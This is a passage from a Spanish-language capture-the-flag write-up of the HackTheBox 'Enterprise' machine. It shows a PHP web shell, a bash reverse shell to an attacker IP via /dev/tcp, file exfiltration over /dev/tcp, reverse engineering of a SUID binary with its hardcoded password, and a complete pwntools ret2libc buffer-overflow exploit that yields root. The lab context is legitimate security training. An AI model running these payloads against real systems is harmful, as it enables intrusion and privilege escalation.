www-data@a7018bfdc454:/var/www/html$ hostname -I
172.17.0.4 
```

Hay un directorio ```files``` cuyo propietario es ```root```

```null
www-data@a7018bfdc454:/var/www/html$ ls -la | grep files
drwxrwxrwx  2 root     root        4096 Oct 17  2017 files
```

Dentro hay un comprimido

```null
www-data@a7018bfdc454:/var/www/html/files$ ls
lcars.zip
```

Pero es lo mismo que tenía antes. Compruebo si este directorio es una montura

```null
www-data@a7018bfdc454:/var/www/html/files$ mount | grep files
/dev/mapper/enterprise--vg-root on /var/www/html/files type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

Como tengo capacidad de escritura, puedo crear un script en ```php``` que se encargue de enviarme una reverse shell, y desde el ```Wordpress```, lo ejecuto desde la máquina víctima, para ganar así acceso

```null
www-data@a7018bfdc454:/var/www/html/files$ echo "<?php system(\$_GET['cmd']); ?>" > pwned.php 
```

Me quedo en escucha con netcat y me envío una reverse shell

```null
curl 'https://10.10.10.61/files/pwned.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.9/443%200%3E%261%27'
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.61] 48442
bash: cannot set terminal process group (1518): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enterprise:/var/www/html/files$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@enterprise:/var/www/html/files$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@enterprise:/var/www/html/files$ export TERM=xterm
www-data@enterprise:/var/www/html/files$ export SHELL=bash
www-data@enterprise:/var/www/html/files$ stty rows 55 columns 209
```

```null
www-data@enterprise:/var/www/html/files$ whoami
www-data
www-data@enterprise:/var/www/html/files$ hostname -I
10.10.10.61 172.17.0.1 dead:beef::250:56ff:feb9:840c 
```

Puedo ver la primera flag

```null
www-data@enterprise:/home/jeanlucpicard$ cat user.txt 
aaf4e2d08168bdab4affde2aa5693ec3
```

# Escalada

Hay un binario SUID llamado ```lcars```

```null
www-data@enterprise:/$ find \-perm \-4000 2>/dev/null 
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
./usr/bin/gpasswd
./usr/bin/newuidmap
./usr/bin/pkexec
./usr/bin/sudo
./usr/bin/at
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/newgidmap
./usr/bin/traceroute6.iputils
./usr/bin/newgrp
./usr/bin/chsh
./bin/umount
./bin/su
./bin/ping
./bin/ntfs-3g
./bin/mount
./bin/lcars
./bin/fusermount
```

Me lo transfiero a mi equipo para analizarlo con ```Ghidra```

```null
www-data@enterprise:/$ cat < ./bin/lcars > /dev/tcp/10.10.16.9/443
```

La función principal se ve así:

<img src="/writeups/assets/img/Enterprise-htb/7.png" alt="">

Y la función del menú

<img src="/writeups/assets/img/Enterprise-htb/8.png" alt="">

Al ejecutar con ```ltrace````  puedo ver con que contraseña se está comparando mi input

```null
ltrace ./lcars
__libc_start_main(0x565f6c91, 1, 0xffa6a8f4, 0x565f6d30 <unfinished ...>
setresuid(0, 0, 0, 0x565f6ca8)                                                                                                   = 0
puts(""
)                                                                                                                         = 1
puts("                 _______ _______"...                 _______ _______  ______ _______
)                                                                                      = 49
puts("          |      |       |_____|"...          |      |       |_____| |_____/ |______
)                                                                                      = 49
puts("          |_____ |_____  |     |"...          |_____ |_____  |     | |    \_ ______|
)                                                                                      = 49
puts(""
)                                                                                                                         = 1
puts("Welcome to the Library Computer "...Welcome to the Library Computer Access and Retrieval System

)                                                                                      = 61
puts("Enter Bridge Access Code: "Enter Bridge Access Code: 
)                                                                                               = 27
fflush(0xf7e1dda0)                                                                                                               = 0
fgets(123
"123\n", 9, 0xf7e1d620)                                                                                                    = 0xffa6a817
strcmp("123\n", "picarda1")                                                                                                      = -1
puts("\nInvalid Code\nTerminating Consol"...
Invalid Code
Terminating Console

)                                                                                    = 35
fflush(0xf7e1dda0)                                                                                                               = 0
exit(0 <no return ...>
+++ exited (status 0) +++
```

Con ```radare2``` enumero todas las funciones

```null
radare2 ./lcars
Warning: run r2 with -e bin.cache=true to fix relocations in disassembly
[0x000005e0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
```

Y las listo

```null
[0x000005e0]> afl
0x000005e0    1 50           entry0
0x00000612    1 4            fcn.00000612
0x000005b0    1 6            sym.imp.__libc_start_main
0x00000c91    1 145          main
0x00000620    1 4            sym.__x86.get_pc_thunk.bx
0x00000550    1 6            sym.imp.setresuid
0x00000750    1 132          sym.startScreen
0x00000590    1 6            sym.imp.puts
0x00000570    1 6            sym.imp.fflush
0x00000580    1 6            sym.imp.fgets
0x00000ba8    4 233          sym.bridgeAuth
0x00000630    4 55           sym.deregister_tm_clones
0x0000074c    1 4            sym.__x86.get_pc_thunk.dx
0x00000670    4 71           sym.register_tm_clones
0x000006c0    5 71           sym.__do_global_dtors_aux
0x000005d0    1 6            sym..plt.got
0x00000710    4 60   -> 56   entry.init0
0x00000d90    1 2            sym.__libc_csu_fini
0x000007d4    1 138          sym.disableForcefields
0x000005c0    1 6            sym.imp.__isoc99_scanf
0x00000560    1 6            sym.imp.printf
0x00000d94    1 20           sym._fini
0x00000b6a    1 62           sym.unable
0x00000d30    4 93           sym.__libc_csu_init
0x0000085e   63 2667 -> 1375 sym.main_menu
0x00000508    3 35           sym._init
0x00000540    1 6            sym.imp.strcmp
0x00000000    7 263  -> 279  loc.imp._ITM_deregisterTMCloneTable
0x000005a0    1 6            sym.imp.exit
0x000005d8    1 6            fcn.000005d8
```

Me sincronizo con el ```main```

```null
[0x000005e0]> s main
```

La veo en ensamblador

```null
[0x00000c91]> pdc
int main (int esi, int edx) {
    loc_0xc91:
        ecx = argv
        esp &= 0xfffffff0 // ebp
        push  (dword [ecx - 4])
        push  (ebp)
        ebp = esp
        push  (ebx)
        push  (ecx)
        esp -= 0x10
        sym.__x86.get_pc_thunk.bx  ()
        ebx += 0x2358 // obj._GLOBAL_OFFSET_TABLE_
        esp -= 4
        push  (0)
        push  (0)
        push  (0)
        sym.imp.setresuid  ()
        esp += 0x10
        sym.startScreen  ()
        esp -= 0xc
        eax = ebx - 0x1ebd // "Enter Bridge Access Code: " str.Enter_Bridge_Access_Code:_
        push  (eax)   // const char *s // (pstr 0x00001143) "Enter Bridge Access Code: "
        sym.imp.puts  ()
        // int puts("Enter Bridge Access Code: ")
        esp += 0x10
        eax = dword [ebx - 0x10]
        eax = dword [eax]
        esp -= 0xc
        push  (eax)   // FILE *stream
        sym.imp.fflush  ()
        // int fflush(?)
        esp += 0x10
        eax = dword [ebx - 0x14]
        eax = dword [eax]
        esp -= 4
        push  (eax)   // FILE *stream
        push  (9)     // int size
        eax = s
        push  (eax)   // char *s
        sym.imp.fgets  ()
        // char *fgets("", 0, ?)
        esp += 0x10
        esp -= 0xc
        eax = s
        push  (eax)   // char *s1
        sym.bridgeAuth  () // sym.bridgeAuth(0x177fe7, 0x3000, 0x178004)
        esp += 0x10
        eax = 0
        esp = var_8h
        ecx = pop  ()
        ebx = pop  ()
        ebp = pop  ()
        esp = ecx - 4 // ebp
        re
         // (break)
}
```

Veo la función ```bridgeAuth()```

<img src="/writeups/assets/img/Enterprise-htb/9.png" alt="">

También se puede ver la contraseña de esta manera

<img src="/writeups/assets/img/Enterprise-htb/10.png" alt="">

La función que corresponde a la selección 4 del menú es la siguiente:

<img src="/writeups/assets/img/Enterprise-htb/11.png" alt="">

Está leyendo el input con ```scanf()``` e imprimiéndolo con un ```printf()```, y como no está sanitizado, es vulnerable a un buffer overflow

```null
./lcars

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code: 
picarda1

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System



LCARS Bridge Secondary Controls -- Main Menu: 

1. Navigation
2. Ships Log
3. Science
4. Security
5. StellaCartography
6. Engineering
7. Exit
Waiting for input: 
4
Disable Security Force Fields
Enter Security Override:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./lcars
```

Con ```gdb```, calculo el offset

```null
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
[+] Saved as '$_gef0'
```

```null
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x422     
$ebx   : 0x63616162 ("baac"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffd6f0  →  "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"
$ebp   : 0x63616163 ("caac"?)
$esi   : 0x56555d30  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x63616164 ("daac"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd6f0│+0x0000: "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"       ← $esp
0xffffd6f4│+0x0004: "faacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacra[...]"
0xffffd6f8│+0x0008: "gaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsa[...]"
0xffffd6fc│+0x000c: "haaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaacta[...]"
0xffffd700│+0x0010: "iaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacua[...]"
0xffffd704│+0x0014: "jaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacva[...]"
0xffffd708│+0x0018: "kaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwa[...]"
0xffffd70c│+0x001c: "laacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x63616164
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "lcars", stopped 0x63616164 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip
[+] Searching for '$eip'
[+] Found at offset 212 (little-endian search) likely
[+] Found at offset 308 (big-endian search) 
```

El binario tiene ```PIE``` habilitado, por lo que las direcciones son aleatorias

```null
gef➤  checksec
[+] checksec for '/home/rubbx/Desktop/HTB/Machines/Enterprise/lcars/lcars'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```

Miro las librerías compartidas

```null
www-data@enterprise:/$ ldd ./bin/lcars
	linux-gate.so.1 =>  (0xf7ffc000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e32000)
	/lib/ld-linux.so.2 (0x56555000)
```

El ASLR está deshabilitado

```null
www-data@enterprise:/$ cat /proc/sys/kernel/randomize_va_space 
0
```

Como voy a realizar un ```ret2libc```, extraigo las direcciones de las funciones ```system``` y ```exit```, desde la máquina víctima

```null
(gdb) b *main
Breakpoint 1 at 0x56555c91
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /bin/lcars 

Breakpoint 1, 0x56555c91 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
```

Busco la cadena ```"/bin/sh"``` para pasársela como argumento a ```system```

```null
(gdb) find &system,+9999999,"/bin/sh"
0xf7f70a0f
warning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search.
1 pattern found.
```

Pero esta no es válida, ya que contiene un salto de línea, por lo que busco solo por la cadena ```"sh"```

```null
(gdb) find &system,+9999999,"sh"
0xf7f6ddd5
0xf7f6e7e1
0xf7f70a14
0xf7f72582
warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
4 patterns found.
```

Creo un exploit que lo automatice

```null
from pwn import *
import sys, signal

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
offset = 212
junk = b"\x90"*offset
ip = "10.10.10.61"
port = 32812

def makeConnection():
    # ret2libc = system_addr + exit_addr + binssh_addr
    
    system_addr = p32(0xf7e4c060)
    exit_addr = p32(0xf7e3faf0)
    binssh_addr = p32(0xf7f6ddd5)

    payload = junk + system_addr + exit_addr + binssh_addr
    
    context(os='linux', arch='i386')
    
    p = remote(ip, port)

    p.recvuntil(b"Enter Bridge Access Code:")
    p.sendline(b"picarda1")
    p.recvuntil(b"Waiting for input:")
    p.sendline(b"4")
    p.recvuntil(b"Enter Security Override:")
    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    makeConnection()
```

Puedo ver la segunda flag

```null
python3 exploit.py
[+] Opening connection to 10.10.10.61 on port 32812: Done
[*] Switching to interactive mode

$ whoami
root
$ cat /root/root.txt
81d6967c8b6fb28675acb64b74bb1efa
```

